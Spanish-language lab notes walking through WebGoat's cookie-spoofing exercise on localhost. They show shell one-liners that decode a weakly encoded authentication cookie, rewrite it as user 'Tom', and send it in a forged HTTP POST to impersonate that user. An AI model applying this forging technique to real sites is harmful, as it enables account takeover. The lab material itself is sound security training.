El Set-Cookies siempre es enviado por el servidor, cuando un usario autetifica su sesion. Recuerda que del lado del cliente siempre enviamos cookies para validar sesion este o no conectado, esto lo hacen para guardar historial u otras cosas.

>[!NOTE]
>It is crucial for the security of the authentication system that the cookie generation algorithm remains secure and not easily guessable. If an attacker can predict or determine the algorithm, they may be able to generate valid authentication cookies for different users, thereby bypassing the authentication mechanism and impersonating other users.


## Comando para desifrar el cookie de una sesion

El siguiente comando funciona para decodificar un base64, luego con xxd lo que hacemos es el leer el hexadecimal ya que es el resultado del base64 decode y una vez que tenemos el hex ocupamos el comando xxd para poder leer el hexadecimal y ocupar un rev ya que la cadena string viene desordeanada. 

```zsh 
# Con esto decodificamos
# Es mejor ocupar el -n para evitar el salto de pagina

echo -n "NzY2YTY3NjE1NzRiNzA2NTc5NmI2ZTY5NmQ2NDYx" | base64 --decode | xxd -r -p | rev

```

En base al resultado que nos da solo modificamos el string que es nuestro usuario y lo cambiamos por el de Tom,despues aplicamos un rev, lo convertimos a hexadecimal y luego ocupamos el comand tr para eliminar los saltos de paginas que nos da el xxd -p, es de suma importancia esto, ya despues lo volvemos a codificar.

```zsh

echo -n "TomkyepKWagjv" | rev | xxd -p | tr -d '\n' | base64

```

Al tener nuesto resultado lo que tenemos que hacer es enviar el comando con un POST pero ya con nuestro cookie spoof mas el cookie de la sesion.

```zsh
POST http://localhost:8080/WebGoat/SpoofCookie/login HTTP/1.1
host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
content-length: 29
Origin: http://localhost:8080
Connection: keep-alive
Referer: http://localhost:8080/WebGoat/start.mvc?username=alffy-root
Cookie: JSESSIONID=390CNJu58mrVnb1fEP4cjtcxVcG50RLK5kZ1R67h; spoof_auth="NzY2YTY3NjE1NzRiNzA2NTc5NmI2ZDZmNTQ="
---------------------------------------------------------------
username=admin&password=admin
```

Si nos damos cuenta no es necesario ocupar otro nombre de usuario, lo que estamos haciendo es que nos logeamos con nuestras credenciales pero en el backend le estamos deiciendo que en realidad somo Tom. Ojo esto solo es valido cuando los cookies aun estan disponibles ya que hay que recordar que usualmente expiran. Por eso es importante protejer las cookies con un buen hash y cada cierto tiempo renovarlas. 
